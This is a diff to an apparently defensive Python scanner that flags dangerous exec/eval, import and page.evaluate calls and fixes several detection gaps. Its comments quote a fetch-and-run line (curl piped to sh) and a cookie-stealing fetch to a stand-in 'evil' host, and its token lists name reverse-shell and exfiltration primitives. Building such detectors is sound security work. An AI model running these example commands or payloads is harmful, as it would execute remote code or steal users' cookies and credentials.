@@ -256,16 +256,74 @@ def _collect_aliases(tree):
 
 
 def _collect_str_consts(tree):
-    """v0.8.1. Module-level `NAME = "<str literal>"` bindings (single-Name target, value a BARE str
-    Constant). Lets `page.evaluate(NAME, data)` recognise a FIXED module-level JS body as constant.
-    LITERAL-ONLY: an f-string / concatenation / call value is deliberately NOT collected, so an
-    interpolated (potentially untrusted) JS body is never mistaken for a constant and stays a sink."""
+    """v0.8.2 HOLE-3 FIX (soundness). Module-level `NAME = "<str literal>"` bindings that are TRULY
+    constant — so `page.evaluate(NAME, data)` may treat a FIXED JS body as constant.
+
+    A name is a usable constant ONLY when, across the WHOLE tree, it is bound EXACTLY ONCE and that single
+    binding is a bare string Constant at module level. Any name that is:
+      * bound more than once anywhere (`X="safe"; X=f"{untrusted}"` — reassignment), OR
+      * ever bound to a NON-constant value (f-string / concat / call / subscript), OR
+      * bound by a non-simple form (tuple/aug/annotated-without-value/walrus/for/with/except/arg)
+    is DROPPED, so the stale literal can never shadow a later untrusted reassignment (the v0.8.1 collector
+    took a module-level literal and ignored reassignment, letting `X=f"{untrusted}"; page.evaluate(X)`
+    resolve to the safe literal and slip through). LITERAL-ONLY and reassignment-SOUND."""
+    bind_count: dict[str, int] = {}
+    all_const: dict[str, bool] = {}
+
+    def _mark(name, is_const_str):
+        bind_count[name] = bind_count.get(name, 0) + 1
+        all_const[name] = all_const.get(name, True) and is_const_str
+
+    # Count EVERY binding of a name anywhere in the tree (not just module level), and whether it is a bare
+    # string constant. Non-simple binding forms are marked non-constant so they always disqualify the name.
+    for n in ast.walk(tree):
+        if isinstance(n, ast.Assign):
+            const_str = isinstance(n.value, ast.Constant) and isinstance(n.value.value, str)
+            simple = len(n.targets) == 1 and isinstance(n.targets[0], ast.Name)
+            for tgt in n.targets:
+                for nm in _iter_target_names(tgt):
+                    _mark(nm, const_str and simple)
+        elif isinstance(n, ast.AnnAssign) and isinstance(n.target, ast.Name):
+            const_str = n.value is not None and isinstance(n.value, ast.Constant) \
+                and isinstance(n.value.value, str)
+            _mark(n.target.id, const_str)
+        elif isinstance(n, ast.AugAssign) and isinstance(n.target, ast.Name):
+            _mark(n.target.id, False)
+        elif isinstance(n, ast.NamedExpr) and isinstance(n.target, ast.Name):
+            _mark(n.target.id, False)
+        elif isinstance(n, (ast.For, ast.AsyncFor)):
+            for nm in _iter_target_names(n.target):
+                _mark(nm, False)
+        elif isinstance(n, (ast.With, ast.AsyncWith)):
+            for item in n.items:
+                if item.optional_vars is not None:
+                    for nm in _iter_target_names(item.optional_vars):
+                        _mark(nm, False)
+        elif isinstance(n, ast.ExceptHandler) and n.name:
+            _mark(n.name, False)
+
+    # Second pass: keep only the module-level, single, bare-string-constant bindings that survived the
+    # disqualification above (bound exactly once, that binding constant).
     out = {}
     for n in tree.body:
         if isinstance(n, ast.Assign) and len(n.targets) == 1 and isinstance(n.targets[0], ast.Name) \
                 and isinstance(n.value, ast.Constant) and isinstance(n.value.value, str):
-            out[n.targets[0].id] = n.value.value
+            nm = n.targets[0].id
+            if bind_count.get(nm) == 1 and all_const.get(nm):
+                out[nm] = n.value.value
     return out
+
+
+def _iter_target_names(tgt):
+    """Yield every Name id bound by an assignment target (handles bare Name, Tuple/List unpacking, and
+    Starred targets). Attribute/Subscript targets bind no local name and are skipped."""
+    if isinstance(tgt, ast.Name):
+        yield tgt.id
+    elif isinstance(tgt, (ast.Tuple, ast.List)):
+        for e in tgt.elts:
+            yield from _iter_target_names(e)
+    elif isinstance(tgt, ast.Starred):
+        yield from _iter_target_names(tgt.value)
 
 
 def _chain_root(node):
@@ -547,15 +605,54 @@ _BENIGN_RESIDUE_VERBS = (_HARD_BENIGN_NAMES | _TELEMETRY_BENIGN_NAMES | _STATUS_
                          | _BENIGN_SPAN_NAMES)
 
 
-def _const_str_code_target(node: ast.Call) -> bool:
-    """v0.8.1 PRECISION. True iff the CODE/MODULE target (first positional arg) of an
-    eval/exec/compile/__import__/import_module call is a CONSTANT STRING LITERAL — the provably-static,
-    non-injectable form (`eval("1+1")`, `__import__("re")`, `compile("<lit>", ...)`). Anything else — a
-    Name, f-string (JoinedStr), concatenation, subscript, call, or a MISSING arg — is NON-constant and
-    MUST stay a dynamic code-exec sink. Mirrors the constant-arg test the codebase already applies to
-    importlib.import_module / page.evaluate: only the developer-authored literal is inert."""
+# v0.8.2 HOLE-1 FIX. The v0.8.1 downgrade wrongly treated a CONSTANT-STRING first arg to *any* code-exec
+# builtin as inert. But `__import__`/`import_module` take a module NAME (genuinely inert as a constant),
+# while `exec`/`eval`/`compile` take a CODE BODY that EXECUTES — `exec("import os; os.system('curl x|sh')")`
+# is a live RCE even though the string is a literal. So the downgrade is now split:
+#   * module-NAME calls (__import__ / import_module): a constant is inert -> not a sink.
+#   * code-BODY calls (exec / eval / compile): a constant body STAYS a sink whenever it carries a danger
+#     token (mirrors the page.evaluate JS screen). A benign constant body (`eval("1+1")`) stays inert.
+_INERT_MODULE_NAME_CALLS = {"__import__", "import_module"}
+# Danger tokens that mark a CONSTANT exec/eval/compile body as a live code-exec surface. Uses dotted /
+# syntactic forms (`os.system`, `subprocess.`, `socket.`, `import os`) so a bare module NAME can never
+# match — `__import__("subprocess")` (module name, inert) is NOT flagged, but `exec("import subprocess;
+# subprocess.call(cmd)")` (code body, executes) IS. Mirrors _JS_EXEC_DANGER for page.evaluate.
+_CODE_BODY_DANGER_TOKENS = ("os.system", "os.popen", "subprocess.", "socket.", "/bin/", "/dev/tcp",
+                            "__import__", "curl", "wget ", "eval(", "exec(", "popen(", "pty.",
+                            ".system(", "import os", "import subprocess", "import socket",
+                            "getoutput", "check_output", "Popen(")
+
+
+def _const_str_first_arg(node: ast.Call):
+    """The first positional arg's constant-string value, or None if the first arg is NOT a bare string
+    literal (a Name, f-string/JoinedStr, concatenation, subscript, call, or a MISSING arg — all of which
+    are the dynamic, potentially-injectable form and MUST stay a sink)."""
     a0 = node.args[0] if node.args else None
-    return isinstance(a0, ast.Constant) and isinstance(a0.value, str)
+    if isinstance(a0, ast.Constant) and isinstance(a0.value, str):
+        return a0.value
+    return None
+
+
+def _code_body_is_dangerous(body: str) -> bool:
+    """True iff a CONSTANT code/JS body carries an execution-of-danger token. A constant body with none of
+    these is developer-authored inert static code (`eval("1+1")`) and may be downgraded; one carrying any
+    token EXECUTES real danger (os.system / subprocess / socket / reverse-shell / nested eval-exec) and
+    stays a code_exec sink."""
+    return any(t in body for t in _CODE_BODY_DANGER_TOKENS)
+
+
+def _const_code_target_inert(node: ast.Call, builtin_name: str = "") -> bool:
+    """True iff this code-exec call's first arg is a CONSTANT that is provably inert:
+      * a module-NAME call (__import__ / import_module) with any constant module name, OR
+      * an exec/eval/compile call whose constant BODY carries no danger token.
+    When `builtin_name` is unknown (alias site), we cannot prove it is a module-name call, so ONLY the
+    benign-body path applies — a dangerous constant body still fires. Non-constant first arg -> NOT inert."""
+    lit = _const_str_first_arg(node)
+    if lit is None:
+        return False
+    if builtin_name in _INERT_MODULE_NAME_CALLS:
+        return True                                   # constant module name -> inert
+    return not _code_body_is_dangerous(lit)           # benign constant body -> inert; dangerous -> sink
 
 
 def _classify_call(node: ast.Call, sym_alias=None, mod_alias=None, inst_map=None,
@@ -613,10 +710,12 @@ def _classify_call_impl(node: ast.Call, sym_alias=None, mod_alias=None, inst_map
     # `_sender = api.send_direct_message`). No literal sink token at the call site; resolved via binding.
     if isinstance(func, ast.Name) and (alias_sinks or {}).get(func.id):
         cap, mut = alias_sinks[func.id]
-        # v0.8.1: a name bound to a builtin code-exec (`_imp = __import__; _imp("re")`) is inert only when
-        # its target is a constant literal — the SAME provably-static test as the direct builtin branch.
-        # A non-constant target (`_imp(user)`) stays RED.
-        if not (cap == "code_exec" and _const_str_code_target(node)):
+        # v0.8.2: a name bound to a builtin code-exec is inert only when its target is a PROVABLY-inert
+        # constant. The bound builtin is unknown here (could be __import__ OR exec/eval), so the module-name
+        # shortcut does NOT apply — a benign constant body (`_imp = __import__; _imp("re")`, `_calc = eval;
+        # _calc("1+1")`) is inert, but a dangerous constant body (`_ex = exec; _ex("import os; os.system(x)")`)
+        # and any non-constant target (`_calc(user)`) stay RED.
+        if not (cap == "code_exec" and _const_code_target_inert(node)):
             return cap, mut, "ast_alias_call", None
     # S9 DET-RECALL: a call through a local bound to `getattr(<known-dangerous receiver>, <attr>)` —
     # attacker/config-selected attribute of os/subprocess/a danger-lib (`fn = getattr(os, verb); fn(x)`,
@@ -640,15 +739,18 @@ def _classify_call_impl(node: ast.Call, sym_alias=None, mod_alias=None, inst_map
         return "model_call", False, "ast_call", None
 
     # code execution (BUILTINS — Name calls only, so df.eval / re.compile attr-calls don't false-fire).
-    # v0.8.1 PRECISION: a CONSTANT STRING code/module target (`eval("1+1")`, `__import__("re")`,
-    # `compile("<lit>", ...)`) is developer-authored & not attacker-injectable — the STATIC form, exactly
-    # what the codebase already excludes for importlib.import_module (below) and page.evaluate. A
-    # NON-constant target (Name / f-string / expression / subscript / missing arg) is the dynamic,
-    # injection-prone form and MUST stay RED (`eval(request.json["x"])`, `__import__(user_var)`).
+    # v0.8.2 HOLE-1 FIX: the constant-target downgrade is now SPLIT by builtin. `__import__` takes a module
+    # NAME — a constant is genuinely inert (`__import__("re")`), so it falls through. `exec`/`eval`/`compile`
+    # take a CODE BODY that EXECUTES: a constant body is inert ONLY if it carries no danger token (`eval("1+1")`
+    # falls through), but a dangerous constant body STAYS a sink (`exec("import os; os.system('curl x|sh')")`
+    # -> RED). A NON-constant target (Name / f-string / expression / subscript / missing arg) is the dynamic,
+    # injection-prone form and always stays RED (`eval(request.json["x"])`, `__import__(user_var)`).
     if isinstance(func, ast.Name) and func.id in ("eval", "exec", "compile", "__import__"):
-        if not _const_str_code_target(node):
-            return "code_exec", True, "ast_call", None
-        # constant-literal target -> provably static, not dynamic code-exec; fall through (not a sink)
+        if not _const_code_target_inert(node, func.id):
+            # dangerous constant body -> STATIC_CODE_EXEC marker; non-constant -> plain dynamic code_exec
+            artifact = "STATIC_CODE_EXEC" if _const_str_first_arg(node) is not None else None
+            return "code_exec", True, "ast_call", artifact
+        # provably-inert (module name, or benign constant body) -> fall through (not a sink)
     # deserialisation RCE (dotted, distinctive)
     if dotted in _DESERIALIZE:
         return "deserialize", True, "ast_call", None
@@ -781,9 +883,16 @@ def _classify_call_impl(node: ast.Call, sym_alias=None, mod_alias=None, inst_map
             _js = code_arg.value
         elif isinstance(code_arg, ast.Name):
             _js = (str_consts or {}).get(code_arg.id)
+        # v0.8.2 HOLE-2 FIX: the constant-JS screen previously checked only code-exec verbs (eval / new
+        # Function / setTimeout). A FIXED JS body can still HARVEST — `page.evaluate("() => fetch('//evil?'
+        # + document.cookie)")` exfiltrates cookies/credentials with no interpolation at all. The screen now
+        # also blocks the data-exfil verbs, so cookie/credential harvesting in a constant body stays a sink.
         _const_safe = (_js is not None
                        and not any(t in _js for t in ("eval(", "new Function", "Function(",
-                                                      "setTimeout(", "setInterval(", "import(")))
+                                                      "setTimeout(", "setInterval(", "import(",
+                                                      "fetch(", "XMLHttpRequest", "sendBeacon",
+                                                      "document.cookie", "localStorage", "sessionStorage",
+                                                      "navigator.credentials", "indexedDB")))
         if code_arg is not None and not _const_safe:
             return "code_exec", True, "ast_call", None
         # constant/absent JS body -> not a code_exec surface; fall through
